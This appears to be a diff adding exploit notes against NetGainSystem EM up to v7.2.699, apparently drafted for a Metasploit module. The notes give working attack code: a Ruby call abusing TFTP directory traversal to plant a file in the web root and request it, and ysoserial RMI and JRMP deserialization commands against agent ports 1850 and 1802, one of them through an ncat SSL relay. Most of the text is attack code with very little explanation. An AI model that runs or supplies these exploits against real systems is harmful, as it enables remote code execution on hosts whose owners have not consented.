@@ -1,0 +1,29 @@
+Not sure if these are the same as any of the candidate issues.
+
+NetGainSystem EM <= v7.2.699 build 1001
+
+directory traversal in the tftp daemon allowing for an arbitrary file to be placed in the the web root.
+  
+::Open3.popen3("tftp -m netascii #{datastore['RHOST']} -c put #{file} ../../../web/#{page}") { |stdin, stdout, stderr, wait_thr| puts stderr.read }
+
+then make a web request:
+
+res = send_request_raw(
+{
+'uri'		=> '/' + page,
+'version'	=> '1.1',
+'method'	=> 'GET',
+}, 5)
+handler
+
+//////////
+
+port 1850 on the agents can be abused via serialization:
+
+pwn = Open3.popen3("java -cp ysoserial-0.0.5-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit #{host} 1850 CommonsCollections6 '#{cmd}'\r\n") { |stdin, stdout, stderr, wait_thr|
+
+port 1802 expects the same. just over a ssl tunnel:
+
+ncat --sh-exec "ncat --ssl <target> 1802" -l 1900 --keep-open
+
+java -cp ysoserial-0.0.5-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1900 CommonsCollections6 'calc.exe'
